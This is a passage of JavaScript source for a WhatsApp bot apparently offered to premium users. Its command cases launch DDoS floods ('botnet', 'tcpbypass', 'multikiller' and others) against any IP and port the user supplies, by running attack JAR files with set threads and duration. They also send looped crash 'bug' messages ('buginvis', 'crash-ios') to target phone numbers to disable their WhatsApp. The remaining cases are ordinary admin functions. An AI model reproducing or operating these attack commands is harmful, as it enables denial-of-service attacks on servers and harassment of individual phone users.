case 'botnet': case 'tcpbypass': case 'ultimatesmasher': case 'sf':
case 'nabcry': {
    if (!isCreator && !isPremium) return m.reply(mess.owner)
    if (!text) return m.reply(`*‼️ Untuk Menjalankan Command:*\n${prefix}${command} _IP:Port_|_Threads_|_Time_|_CPS_`);

    const vii = text.split("|");
    if (vii.length < 4) return m.reply(`*‼️ Format Salah!*\n\nGunakan: ${prefix}${command} _IP:Port_|_Threads_|_Time_|_CPS_\n\nContoh: ${prefix}${command} 1.1.1.1:25565|340|60|1000`);

    const [target, threads, duration, cps] = vii.map(param => param.trim());
    
    await m.reply('⏳ Checking Java installation...');

    try {
        const jakartaTime = getJakartaTime();
        const formattedEndTime = calculateEndTime(duration);

        const responseMessage = `┏━━━⟪ ${title.name} ⟫━━┓\n` +
            `🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 🔥\n` +
            `┗━━━━━━━━━━━━━━━━━━━┛\n` +
            `Date and Time: ${jakartaTime}\n` +
            `Current User's Login: ${m.pushName || 'DanZ-Kev'}\n\n` +
            `📌 *TARGET INFORMATION*\n` +
            `➣ Target: ${target}\n` +
            `➣ Duration: ${duration} seconds\n` +
            `➣ Thread: ${command === 'basic' ? '20' : threads}\n` +
            `➣ Rate: ${cps || 'Default'}\n` +
            `➣ Method: ${command.toUpperCase()}\n` +
            `➣ Time End: ${formattedEndTime}\n\n` +
            `_Notes:_ Untuk cek apakah DDoS Attack Berhasil bisa di cek di website dibawah ini ↓\n` +
            `https://check-host.net/check-tcp?host=${target}`;

        m.reply(responseMessage, {
    footer: `© 2025 DanZ-Kev`,
    buttons: [
        {
            buttonId: `.stopmc ${danztarget}`,
            buttonText: { displayText: `*STOP ATTACK* (${target})` },
            type: 1
        }
    ],
    headerType: 1
});

        // Execute commands based on method
        switch (command) {
            case 'botnet':
            case 'tcpbypass':
            case 'ultimatesmasher':
                await executeJar(command, target, threads, duration, cps);
                setTimeout(async () => {
                    await executeJar('network', target, threads, duration, cps);
                }, 1000);
                break;

            case 'multikiller':
                await executeJar('killer', target, threads, duration, cps);
                setTimeout(async () => {
                    await executeJar('nullping', target, threads, duration, cps);
                }, 500);
                setTimeout(async () => {
                    await executeJar('packet', target, threads, duration, cps);
                }, 1000);
                break;

            case 'sf':
            case 'nabcry':
                await executeSpecialJar(command, target, threads, duration, cps);
                break;

            default:
                await executeJar(command, target, threads, duration, cps);
                break;
        }

    } catch (error) {
        console.error('Failed to execute jar:', error);
        m.reply(`❌ *Gagal menjalankan JAR file!*\n• Error: ${error.message}`);
    }
}
break;

case 'stopmc': {
    if (!isCreator && !isPremium) return m.reply(mess.owner);

    try {
        await m.reply('⏳ Stopping all running processes...');
        
        const runningProcesses = getRunningProcesses();
        
        if (runningProcesses.length === 0) {
            return m.reply('❌ No active processes found to stop.');
        }

        // Jika ada parameter target spesifik
        let target = null;
        if (text) {
            target = text.trim();
        }

        const result = await stopAllProcesses(target);
        const jakartaTime = getJakartaTime();

        let responseMessage = `┏━━━⟪ ${title.name} ⟫━━┓\n` +
            `🛑 𝗦𝗧𝗢𝗣 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 🛑\n` +
            `┗━━━━━━━━━━━━━━━━━━━┛\n` +
            `Date and Time: ${jakartaTime}\n` +
            `Current User's Login: ${m.pushName || 'DanZ-Kev'}\n\n` +
            `📌 *STOP INFORMATION*\n` +
            `➣ Stopped Processes: ${result.stoppedCount}\n` +
            `➣ Target: ${target || 'All'}\n` +
            `➣ Status: Success ✓\n\n` +
            `Previously running processes:\n` +
            `${formatProcessList(runningProcesses)}`;

        if (result.errors && result.errors.length > 0) {
            responseMessage += `\n\n⚠️ Warnings:\n${result.errors.join('\n')}`;
        }

        m.reply(responseMessage);
    } catch (error) {
        console.error('Failed to stop processes:', error);
        m.reply(`❌ *Error stopping processes:*\n• Error: ${error.message}`);
    }
}
break;


// Di luar case, tambahkan ini untuk tracking cooldow
case 'buginvis': case 'buginvisv2': case 'buginvisv3': case "crash-ios": {
    if (!isCreator && !isPremium) return m.reply(mess.owner)
    if (!text) return m.reply(`*Example: ${prefix + command} 6287392784527*`);
    // Get current time in Jakarta timezone (GMT+7)
    const jakartaTime = new Date().toLocaleString('en-US', {
        timeZone: 'Asia/Jakarta',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    }).replace(/(\d+)\/(\d+)\/(\d+), /, '$3-$1-$2 ');
    const cooldownKey = `${command}-${m.sender}`;
    const cooldownTime = 20 * 60 * 1000; // 20 minutes in milliseconds
    if (cooldowns.has(cooldownKey)) {
        const cooldownEnd = cooldowns.get(cooldownKey);
        const remainingTime = cooldownEnd - Date.now();
        if (remainingTime > 0) {
            const minutes = Math.ceil(remainingTime / (60 * 1000));
            return m.reply(`⏳ Please wait ${minutes} minutes before using this command again.`);
        }
    }
    let danztarget = q.replace(/[^0-9]/g, "");
    if (danztarget.startsWith('0')) {
        return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    let target = danztarget + "@s.whatsapp.net";
    let mention = [m.sender, target];
    cooldowns.set(cooldownKey, Date.now() + cooldownTime);
    setTimeout(() => {
        cooldowns.delete(cooldownKey);
    }, cooldownTime);
    try {
        if (command === 'buginvis') {
            for (let i = 0; i < 100; i++) {
                await trashprotocol(target)
                await trashprotocol(target) 
                 await peotocolCarousel(target) 
                 await peotocolCarousel(target) 
                 await ComboSetan(target) 
                 await ComboSetan(target) 
                 await btnStatus(target) 
                 await btnStatus(target) 
            }
        } else if (command === 'buginvisv2') {
            for (let i = 0; i < 100; i++) {
                await protocolbug4(target) 
                await protocolbug4(target) 
                await DelayOverload(target) 
                 await DelayOverload(target) 
                 await PaymentForce(target) 
                 await PaymentForce(target) 
            }
        } else if (command === 'buginvisv3') {
            for (let i = 0; i < 100; i++) {
                await DevilsProtocolV2(target) 
                await DevilsProtocolV2(target) 
                await VampireNewSticker(target) 
                 await VampireNewSticker(target) 
                 await invitechas(target) 
                 await invitechas(target) 
                 await flowerColors(target) 
                 await flowerColors(target) 
            }
         } else if (command === 'crash-ios') {
            for (let i = 0; i < 100; i++) {
                await IpLocation(target) 
                await IpLocation(target) 
                await IpLocation(target) 
                await IpLocation(target) 
            }
        }
        await sleep(1000);
        await m.reply(`┏━━━⟪ ${title.name} ⟫━━┓
🔥 𝗕𝗨𝗚 𝗦𝗘𝗡𝗧 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 🔥
┗━━━━━━━━━━━━━━━━━━━┛
Date and Time: ${jakartaTime}
Current User's Login: DanZ-Kev

📌 *TARGET INFORMATION*
➣ Target: ${danztarget}
➣ Method: ${command.toUpperCase()}
➣ Status: Success ✓

_Notes:_ Command will be available again in 20 minutes.`, {
    footer: `© 2025 DanZ-Kev`,
    buttons: [
        {
            buttonId: `.fixbug ${danztarget}`,
            buttonText: { displayText: `*FIX BUG* (${danztarget})` },
            type: 1
        }
    ],
    headerType: 1
});
    } catch (error) {
        console.error('Error:', error);
        cooldowns.delete(cooldownKey); // Remove cooldown if error occurs
        await m.reply(`❌ *Error sending bug:*\n${error.message}`);
    }
}
break;

case "fixbug": {
if (!isCreator && !isPremium) return m.reply(mess.owner)
if (!text) return m.reply(`*Example: ${prefix + command} 6287392784527*`);
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replygw(`• ɴᴏᴍᴏʀ ᴅɪᴍᴜʟᴀɪ ᴅᴇɴɢᴀɴ ᴀɴɢᴋᴀ 0. ɢᴀɴᴛɪʟᴀʜ ᴅᴇɴɢᴀɴɴʏᴀ ɴᴏᴍᴏʀ ʏᴀɴɢ ʙᴇʀᴀᴡᴀʟᴀɴ ᴋᴏᴅᴇ ɴᴇɢᴀʀᴀ\n\nᴇxᴀᴍᴘʟᴇ : ${prefix + command} 628×××`)
let target = pepec + '@s.whatsapp.net'
for (let i = 0; i < 3; i++) {
await biyu.sendMessage(target, {text: "ᴜɴʟᴏᴄᴋ sᴜᴄᴄᴇsғᴜʟʟʏ  )\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
});
}
m.reply("sᴜᴄᴄᴄᴇsғᴜʟʟʏ ᴄʟᴇᴀʀ ʙᴜɢ");
}
break

case 'mcstatus': {
    if (!isGroup) return m.reply(mess.group);

    try {
        // Get current time in Jakarta timezone (GMT+7)
        const jakartaTime = new Date().toLocaleString('en-US', {
            timeZone: 'Asia/Jakarta',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        }).replace(/(\d+)\/(\d+)\/(\d+), /, '$3-$1-$2 ');

        const response = await axios.get('https://api.mcstatus.io/v2/status/bedrock/play.travzz.biz.id:5012');
        const data = response.data;

        if (data.online) {
            await m.reply(`┏━━━⟪ 𝗠𝗶𝗻𝗲𝗰𝗿𝗮𝗳𝘁 𝗦𝘁𝗮𝘁𝘂𝘀 ⟫━━┓
🎮 𝗦𝗘𝗥𝗩𝗘𝗥 𝗜𝗦 𝗢𝗡𝗟𝗜𝗡𝗘 ✓
┗━━━━━━━━━━━━━━━━━━━┛
Current Date and Time : ${jakartaTime}
Request by: @${m.sender.split("@")[0]}

📌 *SERVER INFORMATION*
➣ Address: play.travzz.biz.id:5012
➣ Version: ${data.version.name}
➣ Players: ${data.players.online}/${data.players.max}
➣ Game Mode: ${data.gamemode || 'N/A'}
➣ MOTD: ${data.motd.clean}`);
        } else {
            await m.reply(`┏━━━⟪ 𝗠𝗶𝗻𝗲𝗰𝗿𝗮𝗳𝘁 𝗦𝘁𝗮𝘁𝘂𝘀 ⟫━━┓
❌ 𝗦𝗘𝗥𝗩𝗘𝗥 𝗜𝗦 𝗢𝗙𝗙𝗟𝗜𝗡𝗘
┗━━━━━━━━━━━━━━━━━━━┛
Current Date and Time : ${jakartaTime}
Request by: @${m.sender.split("@")[0]}

📌 *SERVER INFORMATION*
➣ Address: play.travzz.biz.id:5012
➣ Status: Offline ✗`);
        }
    } catch (error) {
        console.error('Error:', error);
        const jakartaTime = new Date().toLocaleString('en-US', {
            timeZone: 'Asia/Jakarta',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        }).replace(/(\d+)\/(\d+)\/(\d+), /, '$3-$1-$2 ');

        await m.reply(`┏━━━⟪ 𝗠𝗶𝗻𝗲𝗰𝗿𝗮𝗳𝘁 𝗦𝘁𝗮𝘁𝘂𝘀 ⟫━━┓
❌ 𝗘𝗥𝗥𝗢𝗥 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗘𝗥𝗩𝗘𝗥
┗━━━━━━━━━━━━━━━━━━━┛
Current Date and Time : ${jakartaTime}
Request by: @${m.sender.split("@")[0]}

Failed to check server status.
Please try again later.`);
    }
}
break;

case 'cekhost': case 'getip': {
    if (!args[0]) return m.reply('Masukkan host yang ingin dicek!\nContoh: *cekhost google.com*');
    let host = args[0];
    let apiUrl = `https://fastrestapis.fasturl.cloud/tool/checkhost?host=${host}&mode=http`;
    try {
        // Start timing the request
        const startTime = Date.now();
        
        let response = await fetch(apiUrl);
        let data = await response.json();
        
        // Calculate response time
        const responseTimeMs = Date.now() - startTime;
        const responseTimeSec = (responseTimeMs / 1000).toFixed(3);

        if (data.status !== 200 || !data.result) {
            return m.reply('Gagal mengambil data. Pastikan host yang dimasukkan benar.');
        }

        // Get additional ISP information
        let ispInfoUrl = `http://ip-api.com/json/${data.result.host}`;
        let ispResponse = await fetch(ispInfoUrl);
        let ispData = await ispResponse.json();

        // Get current time in UTC format
        let utcTime = new Date().toISOString().replace('T', ' ').slice(0, 19);

        // Get current time in Jakarta timezone (GMT+7)
        let jakartaTime = new Date().toLocaleString('en-US', {
            timeZone: 'Asia/Jakarta',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        }).replace(/(\d+)\/(\d+)\/(\d+), /, '$3-$1-$2 ');

        let resultText = `┏━━━⟪ HOST CHECKER ⟫━━━━━━━⟫\n`;
        resultText += `┃ Time: ${jakartaTime}\n`;
        resultText += `┃ User: ${m.pushName || 'DanZ-Kev'}\n`;
        resultText += `┗━━━━━━━━━━━━━━━━━━━━━━⟫\n\n`;
        
        // Add host information
        resultText += `📌 *TARGET INFORMATION*\n`;
        resultText += `➣ Host: ${data.result.host}\n`;
        resultText += `➣ Response Time: ${responseTimeSec} seconds\n`;
        if (ispData.status === "success") {
            resultText += `➣ ISP: ${ispData.isp || 'N/A'}\n`;
            resultText += `➣ Organization: ${ispData.org || 'N/A'}\n`;
            resultText += `➣ Location: ${ispData.city || 'N/A'}, ${ispData.country || 'N/A'}\n`;
            resultText += `➣ Timezone: ${ispData.timezone || 'N/A'}\n`;
        }
        resultText += `\n📊 *CHECK RESULTS*\n`;

        // Add node results with proper error handling
        for (let node in data.result.result) {
            try {
                let entry = data.result.result[node];
                if (!entry || !entry[0]) continue;
                
                let { country_name, flag_emoji } = entry;
                let nodeResponseTime = entry[0][1] ? entry[0][1].toFixed(3) : 'N/A';
                let status = entry[0][2] || 'N/A';
                let ip = entry[0][4] || 'N/A';

                resultText += `${flag_emoji} *${country_name}*\n`;
                resultText += `➣ Response: ${nodeResponseTime}s\n`;
                resultText += `➣ Status: ${status}\n`;
                resultText += `➣ IP: ${ip}\n\n`;
            } catch (nodeError) {
                console.error(`Error processing node result: ${nodeError}`);
                continue;
            }
        }

        // Add footer
        resultText += `┗━━━━━━━━━━━━━━━━━━━━━━⟫\n`;
        resultText += `Powered by DanZ `;

        m.reply(resultText);
    } catch (e) {
        console.error('Error in host check:', e);
        m.reply('Terjadi kesalahan saat mengambil data.');
    }
}
break;

case "clearsession": case "clearsess": {
    if (!isCreator) return m.reply(mess.owner)
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./database/sampah/" + u)
}
m.reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

case "deviceinfo": case "upping": {
    let os = require("os");
    let { execSync } = require("child_process");

    // Get current time in Jakarta timezone
    let jakartaTime = new Date().toLocaleString('en-US', {
        timeZone: 'Asia/Jakarta',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    }).replace(/(\d+)\/(\d+)\/(\d+), /, '$3-$1-$2 ');

    // Get system info
    let platform = os.platform();
    let arch = os.arch();
    let versionNode = process.version;

    // Get CPU info
    let cpus = os.cpus();
    let cpuModel = cpus[0].model;
    let cpuSpeed = cpus[0].speed;
    let cpuLoad = (os.loadavg()[0] / os.cpus().length) * 100;

    // Get RAM info
    let totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    let freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
    let usedRam = (totalRam - freeRam).toFixed(2);

    // Get storage info
    let diskInfo;
    try {
        diskInfo = execSync("df -h / | tail -1").toString().split(/\s+/);
    } catch (err) {
        diskInfo = ["-", "-", "-", "-", "-", "-"];
    }
    let totalDisk = diskInfo[1];
    let usedDisk = diskInfo[2];
    let availableDisk = diskInfo[3];
    let diskUsage = diskInfo[4];

    // Check ping
    let startTime = process.hrtime();
    let ping = process.hrtime(startTime);
    let latency = (ping[0] * 1e9 + ping[1]) / 1e9;

    // Format message with new template
    let info = `┏━━━⟪ SERVER INFORMATION ⟫━━━━⟫\n`;
    info += `┃ Time: ${jakartaTime} \n`;
    info += `┃ User: ${m.pushName || 'DanZ-Kev'}\n`;
    info += `┗━━━━━━━━━━━━━━━━━━━━━⟫\n\n`;

    // System Information
    info += `📌 *SYSTEM INFORMATION*\n`;
    info += `➣ OS: ${platform} (${os.release()})\n`;
    info += `➣ Architecture: ${arch}\n`;
    info += `➣ Node.js Version: ${versionNode}\n\n`;

    // CPU Information
    info += `💻 *CPU INFORMATION*\n`;
    info += `➣ Model: ${cpuModel}\n`;
    info += `➣ Speed: ${cpuSpeed} MHz\n`;
    info += `➣ CPU Load: ${cpuLoad.toFixed(2)}% (${cpus.length} Cores)\n`;
    info += `➣ Load Average: ${os.loadavg().map(v => v.toFixed(2)).join(", ")}\n\n`;

    // Memory Information
    info += `🎮 *MEMORY (RAM)*\n`;
    info += `➣ Total: ${totalRam} GB\n`;
    info += `➣ Used: ${usedRam} GB\n`;
    info += `➣ Available: ${freeRam} GB\n\n`;

    // Storage Information
    info += `💽 *STORAGE*\n`;
    info += `➣ Total: ${totalDisk}\n`;
    info += `➣ Used: ${usedDisk} (${diskUsage})\n`;
    info += `➣ Available: ${availableDisk}\n\n`;

    // Ping Information
    info += `📡 *NETWORK*\n`;
    info += `➣ Latency: ${latency.toFixed(12)} seconds\n\n`;

    // Footer
    info += `┗━━━━━━━━━━━━━━━━━━━━━⟫\n`;
    info += `Powered by DanZ `;

    await m.reply(info);
}
break;

// Add these new cases to your switch statement

case 'ultraobfuscate': {
	if (!isCreator) return m.reply(mess.owner)
    require('./commands/ultra-obfuscator').start(conn, m, { text, prefix, command });
    break;
}

//==================== OWNER MENU ====================//

case "listprem": case "premlist": case "listpremium": {
    if (!isCreator) return m.reply(mess.owner)
    
    try {
        // Baca database premium
        let premiumUsers = JSON.parse(fs.readFileSync("./database/premium.json"))
        
        if (premiumUsers.length === 0) {
            return m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗜𝗡𝗙𝗢 ⟫━━┓
┃
┣ ℹ️ No Premium Users
┣ ⌬ Database Empty
┣ ⌬ Add User First
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)
        }

        let messageText = `┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗟𝗜𝗦𝗧 ⟫━━┓
┃\n`

        // Array untuk menyimpan promises
        let promises = []
        
        // Ambil info untuk setiap user premium
        for (let user of premiumUsers) {
            let promise = (async () => {
                try {
                    // Dapatkan info user dari nomor
                    let [result] = await biyu.onWhatsApp(user)
                    if (!result) return null
                    
                    // Dapatkan info profil
                    let profile
                    try {
                        profile = await biyu.profilePictureUrl(user, 'image')
                    } catch {
                        profile = 'https://i.ibb.co/jhQ7gL0/Prof-1.jpg' // Default profile pic
                    }
                    
                    // Dapatkan nama user
                    let userName
                    try {
                        userName = (await biyu.getName(user)) || "Unknown"
                    } catch {
                        userName = "Unknown"
                    }

                    return {
                        jid: user,
                        name: userName,
                        profile: profile
                    }
                } catch {
                    return null
                }
            })()
            promises.push(promise)
        }

        // Tunggu semua promises selesai
        let users = (await Promise.all(promises)).filter(u => u !== null)

        // Generate pesan
        for (let i = 0; i < users.length; i++) {
            let user = users[i]
            messageText += `┣━━━⟪ 𝗨𝗦𝗘𝗥 #${i + 1} ⟫━━┓
┃ ⌬ Number: ${user.jid.split('@')[0]}
┃ ⌬ Name: ${user.name}
┃ ⌬ Status: Premium Active
┃\n`
        }

        messageText += `┣━━━⟪ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ⟫━━┓
┃ ⌬ Total Premium: ${users.length}
┃ ⌬ Date: ${tanggal}
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`

        await biyu.sendMessage(m.chat, { 
            text: messageText 
        }, { quoted: m })

    } catch (error) {
        console.error('Error:', error)
        m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Failed to Load Data
┣ ⌬ Error: ${error.message}
┣ ⌬ Try Again Later
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)
    }
}
break

case "addprem": {
    if (!isCreator) return m.reply(mess.owner)
    if (!args[0]) return m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Format Salah!
┣ ⌬ Usage: ${prefix+command} nomor
┣ ⌬ Example: ${prefix+command} 62895640071400
┣ ⌬ Example: ${prefix+command} @user
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)
    
    try {
        // Baca database premium yang ada
        let premiumList = JSON.parse(fs.readFileSync("./database/premium.json"))
        
        // Handle jika ada yang di-tag
        let number
        if (m.quoted) {
            number = m.quoted.sender
        } else if (m.mentionedJid && m.mentionedJid[0]) {
            number = m.mentionedJid[0]
        } else if (args[0]) {
            // Hapus semua karakter non-angka
            number = args[0].replace(/[^0-9]/g, '')
            
            // Pastikan nomor dimulai dengan kode negara
            if (!number.startsWith('62')) {
                if (number.startsWith('0')) {
                    number = '62' + number.slice(1)
                } else {
                    number = '62' + number
                }
            }
            
            // Tambahkan @s.whatsapp.net
            number = number + '@s.whatsapp.net'
        }
        
        // Validasi nomor
        if (!number) return m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Invalid Input!
┣ ⌬ Please Provide Valid Number
┣ ⌬ Or Tag a User
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)

        // Cek apakah nomor valid di WhatsApp
        let ceknya = await biyu.onWhatsApp(number)
        if (ceknya.length == 0) return m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Invalid Number
┣ ⌬ Number Not Registered
┣ ⌬ Please Check The Number
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)

        // Cek apakah nomor sudah ada di database
        if (premiumList.includes(number)) return m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Already Premium!
┣ ⌬ Number: ${number.split('@')[0]}
┣ ⌬ Status: Already Registered
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)

        // Tambahkan ke database
        premiumList.push(number)
        fs.writeFileSync("./database/premium.json", JSON.stringify(premiumList))

        // Get user name if possible
        let userName = "User"
        try {
            userName = (await biyu.getName(number)) || "User"
        } catch {}

        // Kirim pesan sukses
        m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 ⟫━━┓
┃
┣ ✅ Premium Added!
┣ ⌬ Number: ${number.split('@')[0]}
┣ ⌬ Name: ${userName}
┣ ⌬ Type: Premium User
┣ ⌬ Date: ${tanggal}
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)

    } catch (error) {
        console.error(error)
        m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Failed to Add Premium
┣ ⌬ Error: ${error.message}
┣ ⌬ Try Again Later
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)
    }
}
break

case "delprem": {
    if (!isCreator) return m.reply(mess.owner)
    if (!args[0]) return m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Format Salah!
┣ ⌬ Usage: ${prefix+command} nomor
┣ ⌬ Example: ${prefix+command} 6281575064540
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: ${global.creator}`)
    
    ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    unp = premium.indexOf(ya)
    premium.splice(unp, 1)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 ⟫━━┓
┃
┣ ✅ Premium Removed!
┣ ⌬ Number: ${ya.split('@')[0]}
┣ ⌬ Type: Premium User
┣ ⌬ Date: ${tanggal}
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: ${global.creator}`)
}
break

case "addowner": {
    if (!isCreator) return m.reply(mess.owner)
    if (!args[0]) return m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Format Salah!
┣ ⌬ Usage: ${prefix+command} nomor
┣ ⌬ Example: ${prefix+command} 62895640071400
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)
    
    try {
        // Baca database owner yang ada
        let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"))
        
        // Handle jika ada yang di-tag
        let number
        if (m.quoted) {
            number = m.quoted.sender
        } else if (args[0]) {
            // Hapus semua karakter non-angka dan @
            number = args[0].replace(/[^0-9]/g, '')
            
            // Pastikan nomor dimulai dengan kode negara
            if (!number.startsWith('62')) {
                if (number.startsWith('0')) {
                    number = '62' + number.slice(1)
                } else {
                    number = '62' + number
                }
            }
            
            // Tambahkan @s.whatsapp.net
            number = number + '@s.whatsapp.net'
        }
        
        // Validasi nomor
        if (!number) return m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Invalid Input!
┣ ⌬ Please Provide Valid Number
┣ ⌬ Or Tag a User
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)

        // Cek apakah nomor valid di WhatsApp
        let ceknya = await biyu.onWhatsApp(number)
        if (ceknya.length == 0) return m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Invalid Number
┣ ⌬ Number Not Registered
┣ ⌬ Please Check The Number
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)

        // Cek apakah nomor sudah ada di database
        if (ownerList.includes(number)) return m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, ${pushname}
⏰ ${tanggal}
📱 Status: Online

┏━━━⟪ 𝗘𝗥𝗥𝗢𝗥 ⟫━━┓
┃
┣ ❌ Already Owner!
┣ ⌬ Number: ${number.split('@')[0]}
┣ ⌬ Status: Already Registered
┃
┗━━━━━━━━━━━━━━┛

Version: BETA 1.0 | By: DanZ-Kev`)

        // Tambahkan ke database
        ownerList.push(number)
        fs.writeFileSync("./database/owner.json", JSON.stringify(ownerList))

        // Kirim pesan sukses
        m.reply(`┏━━━⟪ ${title.name} ⟫━━┓

